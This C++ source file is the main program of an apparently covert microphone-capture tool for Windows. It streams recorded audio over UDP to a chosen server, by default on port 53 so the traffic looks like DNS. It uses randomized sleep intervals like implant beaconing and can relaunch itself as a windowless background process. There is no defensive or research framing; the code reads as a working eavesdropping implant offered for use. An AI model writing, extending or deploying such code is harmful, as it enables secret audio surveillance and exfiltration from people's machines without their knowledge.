#include "audio.h"
#include <string>
#include <iostream>
#include <vector>

int ArgToInt(const std::string& argName, const char* value) {
    try {
        return std::stoi(value);
    }
    catch (const std::invalid_argument&) {
        throw std::runtime_error("[ERROR] Invalid integer for " + argName + ": " + value);
    }
    catch (const std::out_of_range&) {
        throw std::runtime_error("[ERROR] Value out of range for " + argName + ": " + value);
    }
}

void PrintHelp(const char* exe) {
    std::cout <<
        "Usage:\n"
        "  " << exe << " [options]\n"
        "\n"
        "Options:\n"
        "  --help                 Show this help message and exit\n"
        "  --list                 List available microphones and exit\n"
        "  --mic <index>          Microphone index to use (default: system default)\n"
        "\n"
        "  --server <ip>          Server IP address to send to (default: 127.0.0.1)\n"
        "  --port <port>          UDP port to use (default: 53)\n"
        "  --packet-size <bytes>  Client packet size in bytes (1–65355) (default: 1024)\n"
        "\n"
        "  --sleep <mode>         Sleep profile (0–4) (default: 2)\n"
        "                         0 = 5–20s (Tiny)\n" 
        "                         1 = 10–40s (Short)\n"
        "                         2 = 20–60s (Normal)\n"
        "                         3 = 40–100s (Long)\n"
        "                         4 = 15–400s (Random)\n"
        "\n"
        "  --background           Run in the background (spawns a child process)\n"
        "  --daemon               Internal: indicates the background child process\n"
        "  --verbose              Enable verbose logging\n"
        "\n"
        "Examples:\n"
        "  " << exe << " --list\n"
        "  " << exe << " --mic 1 --server 192.168.1.10 --port 5353\n"
        "  " << exe << " --packet-size 1400 --sleep 3 --background\n";
}

int main(int argc, char* argv[]) {
    bool runInBackground = false;
    bool isChildProcess = false;
    bool listMicrophones = false;
    bool isVerbose = false;

    AudioManager AM;
    int micIndex = -1;
    int packetSize = 1024;
    int sleepInput = 2;
    std::string ip_address = "127.0.0.1";
    int port = 53;
    try {
        for (int i = 1; i < argc; i++) {
            std::string arg = argv[i];
            if (arg == "--help") {
                PrintHelp(argv[0]);
                return 0;
            }
            if (arg == "--background") {
                runInBackground = true;
            }
            else if (arg == "--daemon") {
                isChildProcess = true;
            }
            else if (arg == "--list") {
                listMicrophones = true;
            }
            else if (arg == "--verbose") {
                isVerbose = true;
            }
            else if (arg == "--sleep" && i + 1 < argc) {
                sleepInput = ArgToInt("--sleep", argv[++i]);
                if (sleepInput < 0 || sleepInput > 4) {
                    std::cerr << "[ERROR] Invalid sleep input: " << sleepInput << " must be between 0->4" << std::endl;
                    return 1;
                }
            }
            else if (arg == "--packet-size" && i + 1 < argc) {
                packetSize = ArgToInt("--packet-size", argv[++i]);
                if (packetSize <= 0 || packetSize > 65355) {
                    std::cerr << "[ERROR] Invalid packet size input: " << packetSize << " must be between 1->65355" << std::endl;
                    return 1;
                }
            }
            else if (arg == "--mic" && i + 1 < argc) {
                micIndex = ArgToInt("--mic", argv[++i]);
            }
            else if (arg == "--server" && i + 1 < argc) {
                ip_address = argv[++i];
            }
            else if (arg == "--port" && i + 1 < argc) {
                port = ArgToInt("--port", argv[++i]);
                if (port <= 0 || port > 65355) {
                    std::cerr << "[ERROR] Invalid port: " << port << " must be between 1->65355" << std::endl;
                    return 1;
                }
            }
        }
    }
    catch (const std::exception& e) {
        std::cerr << e.what() << std::endl;
        return 1;
    }

    // 2. Background Spawning Logic
    // If user wants background AND we aren't already the background child
    if (runInBackground && !isChildProcess) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        std::string cmd = "\"" + std::string(path) + "\" --daemon";
        for (int i = 1; i < argc; i++) {
            std::string arg = argv[i];
            if (arg != "--background") {
                cmd += " " + arg;
            }
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);

        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return 0;
        }
        else {
            std::cerr << "[ERROR] Failed to create background process. Error: " << GetLastError() << "\n";
            return 1;
        }
    }

    AM.SetIsVerbose(isVerbose);

    if (micIndex != -1) {
        AM.SelectMicrophoneFromInt(micIndex);
    }
    
    if (!AM.Initialize()) {
        std::cerr << "[ERROR] Initialization failed.\n";
        return 1;
    }

    // 3. Execution Flow
    if (listMicrophones) {
        AM.ListMicrophones();
        return 0;
    }

    // Settings
    AM.SetPacketSize(packetSize);
    AM.SetSleepMode(sleepInput);
    AM.SetListener(ip_address, port);

    AM.Start();
    return 0;
}
